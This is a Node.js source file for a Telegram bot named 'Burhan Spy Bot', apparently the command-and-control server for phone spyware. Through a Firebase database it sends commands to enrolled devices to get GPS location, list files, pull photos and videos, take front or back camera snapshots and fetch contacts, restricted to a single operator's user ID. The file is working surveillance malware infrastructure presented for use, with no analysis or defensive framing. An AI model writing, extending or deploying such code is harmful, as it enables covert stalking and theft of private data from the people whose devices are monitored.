const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');

const token = process.env.TOKEN; // Railway se TOKEN milega
const YOUR_USER_ID = process.env.USER_ID; // Railway se USER_ID milega

const bot = new TelegramBot(token, { polling: false }); // Polling OFF, Webhook use hoga
const app = express();
app.use(express.json());

// Firebase Setup
const serviceAccount = require('./firebase-service-account.json');
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
});
const db = admin.database();

// ✅ Webhook Receiver (Telegram messages yahan aayenge)
app.post('/webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ✅ Authorization
function isAuthorized(msg) {
    return String(msg.from.id) === String(YOUR_USER_ID);
}

// ================= COMMANDS =================

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥`);
});

// /stop
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🛑 Bot stopped. Use /start to resume.`);
});

// /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `📜 Commands:\n/locate <ID> - Get GPS + info\n/devices - List all devices\n/files <ID> - List files\n/getphoto <ID> <FILE> - Get photo\n/getvideo <ID> <FILE> - Get video\n/camera <ID> [front|back] - Snapshot\n/ping <ID> - Check alive\n/stats - Total devices\n/contacts <ID> - Fetch contacts\n/stop - Stop bot\n/start - Resume bot`);
});

// /devices
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
        Object.entries(devices).forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n🔋 Battery: ${d.battery}%\n📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n🕒 ${d.time}\n\n`;
        });
        bot.sendMessage(chatId, message);
    });
});

// /stats
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
    });
});

// /locate <ID>
bot.onText(/\/locate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('locate', (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📍 Locate command sent to device ${deviceId}.`);
            // Optionally, you can fetch current location from devices node if available
            db.ref('devices').child(deviceId).once('value', (snap) => {
                const dev = snap.val() || {};
                if (dev.location) {
                    bot.sendMessage(chatId, `📍 **Location:**\nLat: ${dev.location.lat}\nLng: ${dev.location.lng}\nTime: ${dev.location.time || 'N/A'}`);
                }
            });
        }
    });
});

// /files <ID>
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('list_files', (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📂 File list request sent for device ${deviceId}.`);
        }
    });
});

// /getphoto <ID> <FILE>
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    const fileName = match[2].trim();
    db.ref('commands').child(deviceId).set({ type: 'get_photo', file: fileName }, (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}, file: ${fileName}.`);
        }
    });
});

// /getvideo <ID> <FILE>
bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    const fileName = match[2].trim();
    db.ref('commands').child(deviceId).set({ type: 'get_video', file: fileName }, (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📹 Video request sent for device ${deviceId}, file: ${fileName}.`);
        }
    });
});

// /camera <ID> [front|back]
bot.onText(/\/camera (.+) (front|back)?/i, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    const camera = (match[2] || 'back').toLowerCase();
    db.ref('commands').child(deviceId).set({ type: 'camera', camera: camera }, (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📷 Snapshot request sent for device ${deviceId} (${camera} cam).`);
        }
    });
});

// /ping <ID>
bot.onText(/\/ping (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('ping', (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📡 Ping sent to device ${deviceId}.`);
        }
    });
});

// /contacts <ID>
bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('get_contacts', (error) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error sending command.`);
        } else {
            bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}.`);
        }
    });
});

// ✅ Server Start (use process.env.PORT for Railway)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
